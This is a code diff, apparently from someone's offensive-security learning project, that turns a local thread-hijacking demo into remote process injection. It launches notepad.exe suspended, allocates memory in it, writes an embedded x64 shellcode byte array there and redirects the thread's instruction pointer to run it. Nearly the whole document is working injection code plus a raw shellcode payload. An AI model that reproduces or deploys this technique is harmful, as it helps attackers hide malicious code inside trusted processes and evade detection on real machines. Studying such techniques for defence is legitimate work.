@@ -6,24 +6,72 @@
 Suspend then patch the rip register from a thread to point to the shellcode !
  - use GetThreadConext -> Populate CONTEXT struct (https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-context)
  - then setThreadContext -> apply a said CONTEXT to a thread
-
-
 */
-void dummy(){
-    printf("Hi from dummy ! \n");
+BOOL create_suspended_proc(IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread){
+    CHAR				    lpPath          [MAX_PATH * 2];
+	CHAR				    WnDr            [MAX_PATH];
+
+	STARTUPINFO			    Si              = { 0 };
+	PROCESS_INFORMATION		Pi              = { 0 };
+
+	// Cleaning the structs by setting the member values to 0
+	RtlSecureZeroMemory(&Si, sizeof(STARTUPINFO));
+	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));
+
+	// Setting the size of the structure
+	Si.cb = sizeof(STARTUPINFO);
+
+	// Getting the value of the %WINDIR% environment variable
+    //Pour eviter le cas ou le systeme est pas sur C:\ par exemple
+	if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
+		printf("[!] GetEnvironmentVariableA Failed With Error : %d \n", GetLastError());
+		return FALSE;
+	}
+
+	// Creating the full target process path 
+	sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);
+	printf("\n\t[i] Running : \"%s\" ... \n", lpPath);
+
+	if (!CreateProcessA(
+		NULL,					// No module name (use command line)
+		lpPath,					// Command line
+		NULL,					// Process handle not inheritable
+		NULL,					// Thread handle not inheritable
+		FALSE,					// Set handle inheritance to FALSE
+		CREATE_SUSPENDED,		// Creation flag
+		NULL,					// Use parent's environment block
+		NULL,					// Use parent's starting directory 
+		(LPSTARTUPINFOA)&Si,	// Pointer to STARTUPINFO structure
+		&Pi)) {					// Pointer to PROCESS_INFORMATION structure
+
+		printf("[!] CreateProcessA Failed with Error : %d \n", GetLastError());
+		return FALSE;
+	}
+
+	printf("[+] DONE \n");
+
+	// Populating the OUT parameters with CreateProcessA's output
+	*dwProcessId    = Pi.dwProcessId;
+	*hProcess       = Pi.hProcess;
+	*hThread        = Pi.hThread;
+	
+	// Doing a check to verify we got everything we need
+	if (*dwProcessId != 0 && *hProcess != NULL && *hThread != NULL)
+		return TRUE;
+
+	return FALSE;
 }
 
-int hijack_dummy(HANDLE hThread, PBYTE pPayload, size_t sPayloadSize) {
-
-    PVOID   Address         = NULL;
+int hijack_remote_dummy(HANDLE hProcess, HANDLE hThread, PBYTE pPayload, size_t sPayloadSize) {
+    DWORD dwOldProtection = 0;
     PVOID   pAddress        = NULL;
-	DWORD   dwOldProtection = 0;
+	size_t   bytesWritten    = 0;
 	CONTEXT ThreadCtx       = { 
 		.ContextFlags = CONTEXT_CONTROL 
 	};
 
     // Allocating memory for the payload
-	pAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	pAddress = VirtualAllocEx(hProcess, NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	if (pAddress == NULL){
 		printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
 		return FALSE;
@@ -31,7 +79,7 @@ int hijack_dummy(HANDLE hThread, PBYTE pPayload, size_t sPayloadSize) {
     printf("[+] Shellcode space allocated at 0x%p w/ RW\n", pAddress);
 
 	// Copying the payload to the allocated memory
-	memcpy(pAddress, pPayload, sPayloadSize);
+	WriteProcessMemory(hProcess, pAddress, pPayload, sPayloadSize, &bytesWritten);
     printf("[+] Shellcode written in code cave\n");
 
     // Getting the original thread context
@@ -52,7 +100,7 @@ int hijack_dummy(HANDLE hThread, PBYTE pPayload, size_t sPayloadSize) {
 	}
     printf("[+] Hijacked context applied to thread !\n");
     // Changing the memory protection
-	if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtection)) {
+	if (!VirtualProtectEx(hProcess, pAddress, sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtection)) {
 		printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
 		return FALSE;
 	}
@@ -89,15 +137,16 @@ int main(int argc, char** argv){
         "\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";
     size_t shellcode_64_sz = sizeof(shellcode_64);
 
-    //Create the dummy target thread
-    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&dummy, NULL, CREATE_SUSPENDED, NULL);
-    if(hThread == NULL) {
-        printf("[-] CreateThread Failed : %d\n", GetLastError());
-        return FALSE;
-    }
-    printf("[+] Remote Thread created !\n");
+    LPCSTR lpProcessName = "notepad.exe";
+    DWORD dwProcessId = 0;
+    HANDLE hProcess = NULL;
+    HANDLE hThread = NULL;
 
-    if(!hijack_dummy(hThread, (PBYTE)&shellcode_64, shellcode_64_sz)) {
+    create_suspended_proc(lpProcessName, &dwProcessId, &hProcess, &hThread);
+
+    printf("[+] Remote Process (%s) created !\n", lpProcessName);
+
+    if(!hijack_remote_dummy(hProcess, hThread, (PBYTE)&shellcode_64, shellcode_64_sz)) {
         printf("[-] hijack_dummy Failed : %d\n", GetLastError());
         return FALSE;
     }
